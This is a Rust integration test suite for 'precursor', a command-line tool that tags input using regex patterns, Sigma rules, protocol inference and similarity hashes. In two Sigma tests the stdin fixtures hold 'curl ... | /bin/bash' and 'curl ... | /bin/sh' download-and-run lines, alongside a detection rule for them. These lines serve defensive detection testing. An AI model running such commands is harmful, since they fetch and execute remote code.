use serde_json::Value;
use std::io::Write;
use std::path::PathBuf;
use std::process::{Command, Output, Stdio};
use std::time::{SystemTime, UNIX_EPOCH};

struct TempDirGuard {
    path: PathBuf,
}

impl Drop for TempDirGuard {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.path);
    }
}

struct TempFileGuard {
    path: PathBuf,
}

impl Drop for TempFileGuard {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.path);
    }
}

fn unique_temp_path(stem: &str, suffix: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("clock")
        .as_nanos();
    std::env::temp_dir().join(format!(
        "{}-{}-{}.{}",
        stem,
        std::process::id(),
        nanos,
        suffix
    ))
}

fn run_precursor(args: &[&str], stdin_payload: &str) -> Output {
    run_precursor_bytes(args, stdin_payload.as_bytes())
}

fn run_precursor_bytes(args: &[&str], stdin_payload: &[u8]) -> Output {
    let mut cmd = Command::new(env!("CARGO_BIN_EXE_precursor"));
    cmd.args(args)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = cmd.spawn().expect("failed to spawn precursor");
    if let Some(stdin) = child.stdin.as_mut() {
        stdin
            .write_all(stdin_payload)
            .expect("failed to write stdin");
    }
    let output = child.wait_with_output().expect("failed to wait on process");
    assert!(
        output.status.success(),
        "process failed with status {:?}\nstderr: {}",
        output.status.code(),
        String::from_utf8_lossy(&output.stderr)
    );
    output
}

fn parse_ndjson(stdout: &[u8]) -> Vec<Value> {
    String::from_utf8_lossy(stdout)
        .lines()
        .filter(|line| !line.trim().is_empty())
        .map(|line| {
            serde_json::from_str::<Value>(line)
                .unwrap_or_else(|err| panic!("invalid JSON line {:?}: {}", line, err))
        })
        .collect()
}

fn parse_stats_json(stderr: &[u8]) -> Value {
    let stderr_text = String::from_utf8_lossy(stderr);
    let marker = "\"---PRECURSOR_STATISTICS---\"";
    let marker_idx = stderr_text
        .find(marker)
        .unwrap_or_else(|| panic!("expected stats marker in stderr, got: {}", stderr_text));
    let start = stderr_text[..marker_idx]
        .rfind('{')
        .unwrap_or_else(|| panic!("expected stats JSON start in stderr: {}", stderr_text));
    let end = stderr_text[marker_idx..]
        .rfind('}')
        .map(|offset| marker_idx + offset)
        .unwrap_or_else(|| panic!("expected stats JSON end in stderr: {}", stderr_text));
    serde_json::from_str(&stderr_text[start..=end]).unwrap_or_else(|err| {
        panic!(
            "unable to parse stats JSON from stderr: {}\nraw:\n{}",
            err, stderr_text
        )
    })
}

#[test]
fn single_packet_emits_protocol_fields() {
    let output = run_precursor(
        &["(?<http_get>GET)", "-m", "string", "-P"],
        "GET /index.html HTTP/1.1 Host: example.org User-Agent: precursor-test\n",
    );

    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 1);
    let report = &reports[0];
    assert!(report.get("protocol_label").is_some());
    assert!(report.get("protocol_confidence").is_some());
    assert!(report.get("protocol_abstained").is_some());
    assert!(report
        .get("protocol_candidates")
        .and_then(Value::as_array)
        .map(|candidates| !candidates.is_empty())
        .unwrap_or(false));
}

#[test]
fn protocol_hints_include_inference_context() {
    let line_one =
        "GET /one HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-aaaaaaaaaa";
    let line_two =
        "GET /two HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-bbbbbbbbbb";
    let stdin_payload = format!("{}\n{}\n", line_one, line_two);

    let output = run_precursor(
        &[
            "(?<http_get>GET)",
            "-m",
            "string",
            "-P",
            "-t",
            "-d",
            "--protocol-hints",
            "--protocol-hints-limit",
            "5",
        ],
        &stdin_payload,
    );

    let stderr = String::from_utf8_lossy(&output.stderr);
    let start = stderr
        .find('{')
        .unwrap_or_else(|| panic!("expected protocol hint JSON in stderr, got: {}", stderr));
    let end = stderr
        .rfind('}')
        .unwrap_or_else(|| panic!("expected protocol hint JSON in stderr, got: {}", stderr));
    let hints: Value = serde_json::from_str(&stderr[start..=end])
        .unwrap_or_else(|err| panic!("unable to parse hint JSON: {} in {}", err, stderr));

    assert!(hints.get("---PRECURSOR_PROTOCOL_HINTS---").is_some());
    assert!(hints.get("Candidates").and_then(Value::as_array).is_some());
}

#[test]
fn input_blob_mode_supports_multiline_patterns() {
    let pattern = "(?<multi>GET /blob HTTP/1\\.1\\nHost: blob\\.example)";
    let blob_payload = "GET /blob HTTP/1.1\nHost: blob.example\n";

    let line_output = run_precursor(&[pattern, "-m", "string"], blob_payload);
    let line_reports = parse_ndjson(&line_output.stdout);
    assert_eq!(
        line_reports.len(),
        0,
        "line mode should not match cross-line pattern"
    );

    let blob_output = run_precursor(&[pattern, "-m", "string", "-z"], blob_payload);
    let blob_reports = parse_ndjson(&blob_output.stdout);
    assert_eq!(blob_reports.len(), 1);
    assert!(blob_reports[0]
        .get("tags")
        .and_then(Value::as_array)
        .map(|tags| tags.iter().any(|tag| tag.as_str() == Some("multi")))
        .unwrap_or(false));
}

#[test]
fn input_binary_short_flag_matches_raw_blob_stdin() {
    let payload = vec![0x7f, b'E', b'L', b'F', 0x02, 0x01, 0x01, 0x00];
    let output = run_precursor_bytes(&["(?<elf_magic>^\\x7fELF)", "-B"], &payload);
    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 1);
    assert!(reports[0]
        .get("tags")
        .and_then(Value::as_array)
        .map(|tags| tags.iter().any(|tag| tag.as_str() == Some("elf_magic")))
        .unwrap_or(false));
}

#[test]
fn input_binary_mode_treats_each_file_as_blob() {
    let temp_dir_path = unique_temp_path("precursor-binary", "d");
    std::fs::create_dir_all(&temp_dir_path).expect("create temp dir");
    let _temp_dir_guard = TempDirGuard {
        path: temp_dir_path.to_path_buf(),
    };
    let first = temp_dir_path.join("first.bin");
    let second = temp_dir_path.join("second.bin");
    std::fs::write(&first, [0x7f, b'E', b'L', b'F', 0x02, 0x01]).expect("write first payload");
    std::fs::write(&second, [b'M', b'Z', 0x90, 0x00, 0x03, 0x00]).expect("write second payload");

    let output = run_precursor(
        &[
            "-p",
            "samples/scenarios/firmware-fragment-triage/patterns.pcre",
            "-f",
            temp_dir_path.to_str().expect("temp dir utf8"),
            "--input-mode",
            "binary",
        ],
        "",
    );

    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 2);
    assert!(reports.iter().any(|report| {
        report
            .get("tags")
            .and_then(Value::as_array)
            .map(|tags| tags.iter().any(|tag| tag.as_str() == Some("elf_magic")))
            .unwrap_or(false)
    }));
    assert!(reports.iter().any(|report| {
        report
            .get("tags")
            .and_then(Value::as_array)
            .map(|tags| tags.iter().any(|tag| tag.as_str() == Some("pe_mz_magic")))
            .unwrap_or(false)
    }));
}

#[test]
fn sigma_rule_flag_generates_patterns_without_pattern_file() {
    let output = run_precursor(
        &[
            "--sigma-rule",
            "samples/scenarios/sigma-linux-shell-command-triage/sigma_rule.yml",
            "-m",
            "string",
        ],
        "curl -fsSL http://198.51.100.4/run | /bin/bash\n",
    );
    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 1);
    assert!(reports[0]
        .get("tags")
        .and_then(Value::as_array)
        .map(|tags| tags.iter().any(|tag| {
            tag.as_str()
                .map(|value| value.starts_with("sigma_"))
                .unwrap_or(false)
        }))
        .unwrap_or(false));
    assert!(reports[0]
        .get("sigma_rule_matches")
        .and_then(Value::as_array)
        .map(|rules| !rules.is_empty())
        .unwrap_or(false));
}

#[test]
fn sigma_condition_filters_partial_selector_matches() {
    let sigma_path = unique_temp_path("precursor-sigma", "yml");
    let _sigma_guard = TempFileGuard {
        path: sigma_path.to_path_buf(),
    };
    let mut sigma_file = std::fs::File::create(&sigma_path).expect("create temp sigma file");
    let sigma_rule = r#"title: Sigma Condition Filter Test
id: sigma-condition-filter-test
detection:
  selection_fetch:
    CommandLine|contains:
      - 'curl '
  selection_shell:
    CommandLine|contains:
      - '/bin/sh'
  condition: selection_fetch and selection_shell
"#;
    sigma_file
        .write_all(sigma_rule.as_bytes())
        .expect("write sigma rule");

    let payloads = "curl http://198.51.100.1/run\ncurl http://198.51.100.2/run | /bin/sh\n";
    let output = run_precursor(
        &[
            "--sigma-rule",
            sigma_path.to_str().expect("sigma path utf8"),
            "-m",
            "string",
        ],
        payloads,
    );
    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 1);
    assert!(reports[0]
        .get("sigma_rule_ids")
        .and_then(Value::as_array)
        .map(|ids| ids
            .iter()
            .any(|id| id.as_str() == Some("sigma_condition_filter_test")))
        .unwrap_or(false));
}

#[test]
fn vectorscan_engine_scaffold_runs_with_pcre2_fallback() {
    let output = run_precursor(
        &[
            "(?<http_get>GET)",
            "-m",
            "string",
            "--regex-engine",
            "vectorscan",
        ],
        "GET /test HTTP/1.1 Host: example.org\n",
    );
    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 1);
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("compatibility scaffold"));
}

#[test]
fn lzjd_similarity_mode_emits_backend_hashes() {
    let line_one =
        "GET /one HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-aaaaaaaaaa";
    let line_two =
        "GET /two HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-bbbbbbbbbb";
    let stdin_payload = format!("{}\n{}\n", line_one, line_two);

    let output = run_precursor(
        &[
            "(?<http_get>GET)",
            "-m",
            "string",
            "-t",
            "-d",
            "--similarity-mode",
            "lzjd",
            "-x",
            "100",
        ],
        &stdin_payload,
    );

    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 2);

    assert!(reports.iter().all(|report| {
        report
            .get("similarity_hash")
            .and_then(Value::as_str)
            .map(|value| value.starts_with("lzjd:"))
            .unwrap_or(false)
    }));

    assert!(reports.iter().any(|report| {
        report
            .get("tlsh_similarities")
            .and_then(Value::as_object)
            .map(|obj| !obj.is_empty())
            .unwrap_or(false)
    }));
}

#[test]
fn fbhash_similarity_mode_emits_backend_hashes() {
    let line_one =
        "GET /one HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-aaaaaaaaaa";
    let line_two =
        "GET /two HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-bbbbbbbbbb";
    let stdin_payload = format!("{}\n{}\n", line_one, line_two);

    let output = run_precursor(
        &[
            "(?<http_get>GET)",
            "-m",
            "string",
            "-t",
            "-d",
            "--similarity-mode",
            "fbhash",
            "-x",
            "100",
        ],
        &stdin_payload,
    );

    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 2);

    assert!(reports.iter().all(|report| {
        report
            .get("similarity_hash")
            .and_then(Value::as_str)
            .map(|value| value.starts_with("fbhash:"))
            .unwrap_or(false)
    }));

    assert!(reports.iter().any(|report| {
        report
            .get("tlsh_similarities")
            .and_then(Value::as_object)
            .map(|obj| !obj.is_empty())
            .unwrap_or(false)
    }));
}

#[test]
fn stats_flag_emits_schema_with_expected_types() {
    let input = [
        "GET /alpha HTTP/1.1 Host: example.org User-Agent: stats-test-agent-aaaaaaaaaaaaaaaa",
        "GET /beta HTTP/1.1 Host: example.org User-Agent: stats-test-agent-bbbbbbbbbbbbbbbb",
        "GET /gamma HTTP/1.1 Host: example.org User-Agent: stats-test-agent-cccccccccccccccc",
    ]
    .join("\n")
        + "\n";

    let output = run_precursor(
        &[
            "(?<http_get>GET)",
            "-m",
            "string",
            "-t",
            "-d",
            "--similarity-mode",
            "lzjd",
            "--stats",
        ],
        input.as_str(),
    );

    let stats = parse_stats_json(&output.stderr);
    assert!(stats.get("---PRECURSOR_STATISTICS---").is_some());

    let input_obj = stats
        .get("Input")
        .and_then(Value::as_object)
        .expect("expected Input object");
    assert_eq!(
        input_obj
            .get("Count")
            .and_then(Value::as_i64)
            .expect("expected Input.Count"),
        3
    );
    assert!(input_obj.get("TotalSize").and_then(Value::as_str).is_some());

    let match_obj = stats
        .get("Match")
        .and_then(Value::as_object)
        .expect("expected Match object");
    assert!(
        match_obj
            .get("Patterns")
            .and_then(Value::as_i64)
            .expect("expected Match.Patterns")
            >= 1
    );
    assert!(
        match_obj
            .get("HashesGenerated")
            .and_then(Value::as_i64)
            .expect("expected Match.HashesGenerated")
            >= 1
    );

    let compare_obj = stats
        .get("Compare")
        .and_then(Value::as_object)
        .expect("expected Compare object");
    assert!(
        compare_obj
            .get("Similarities")
            .and_then(Value::as_i64)
            .expect("expected Compare.Similarities")
            >= 1
    );

    let env_obj = stats
        .get("Environment")
        .and_then(Value::as_object)
        .expect("expected Environment object");
    assert_eq!(
        env_obj
            .get("SimilarityMode")
            .and_then(Value::as_str)
            .expect("expected SimilarityMode"),
        "lzjd"
    );
    assert_eq!(
        env_obj
            .get("RegexEngine")
            .and_then(Value::as_str)
            .expect("expected RegexEngine"),
        "pcre2"
    );
}

#[test]
fn stats_flag_reports_selected_similarity_mode_for_default_backends() {
    let input = [
        "GET /alpha HTTP/1.1 Host: example.org User-Agent: stats-mode-agent-aaaaaaaaaaaaaaaa",
        "GET /beta HTTP/1.1 Host: example.org User-Agent: stats-mode-agent-bbbbbbbbbbbbbbbb",
        "GET /gamma HTTP/1.1 Host: example.org User-Agent: stats-mode-agent-cccccccccccccccc",
    ]
    .join("\n")
        + "\n";

    for mode in ["tlsh", "lzjd", "fbhash"] {
        let output = run_precursor(
            &[
                "(?<http_get>GET)",
                "-m",
                "string",
                "-t",
                "-d",
                "--similarity-mode",
                mode,
                "--stats",
            ],
            input.as_str(),
        );
        let stats = parse_stats_json(&output.stderr);
        let env_obj = stats
            .get("Environment")
            .and_then(Value::as_object)
            .expect("expected Environment object");
        assert_eq!(
            env_obj
                .get("SimilarityMode")
                .and_then(Value::as_str)
                .expect("expected SimilarityMode"),
            mode
        );
    }
}

#[test]
fn stats_flag_reports_selected_regex_engine() {
    let input = [
        "GET /alpha HTTP/1.1 Host: example.org User-Agent: stats-regex-agent-aaaaaaaaaaaaaaaa",
        "GET /beta HTTP/1.1 Host: example.org User-Agent: stats-regex-agent-bbbbbbbbbbbbbbbb",
        "GET /gamma HTTP/1.1 Host: example.org User-Agent: stats-regex-agent-cccccccccccccccc",
    ]
    .join("\n")
        + "\n";

    let output = run_precursor(
        &[
            "(?<http_get>GET)",
            "-m",
            "string",
            "-t",
            "-d",
            "--similarity-mode",
            "lzjd",
            "--regex-engine",
            "vectorscan",
            "--stats",
        ],
        input.as_str(),
    );
    let stats = parse_stats_json(&output.stderr);
    let env_obj = stats
        .get("Environment")
        .and_then(Value::as_object)
        .expect("expected Environment object");
    assert_eq!(
        env_obj
            .get("RegexEngine")
            .and_then(Value::as_str)
            .expect("expected RegexEngine"),
        "vectorscan"
    );
}

#[cfg(feature = "similarity-mrshv2")]
#[test]
fn mrshv2_similarity_mode_emits_backend_hashes() {
    let line_one =
        "GET /one HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-aaaaaaaaaa";
    let line_two =
        "GET /two HTTP/1.1 Host: example.org User-Agent: precursor-long-test-agent-bbbbbbbbbb";
    let stdin_payload = format!("{}\n{}\n", line_one, line_two);

    let output = run_precursor(
        &[
            "(?<http_get>GET)",
            "-m",
            "string",
            "-t",
            "-d",
            "--similarity-mode",
            "mrshv2",
            "-x",
            "100",
        ],
        &stdin_payload,
    );

    let reports = parse_ndjson(&output.stdout);
    assert_eq!(reports.len(), 2);

    assert!(reports.iter().all(|report| {
        report
            .get("similarity_hash")
            .and_then(Value::as_str)
            .map(|value| value.starts_with("mrshv2:"))
            .unwrap_or(false)
    }));
}
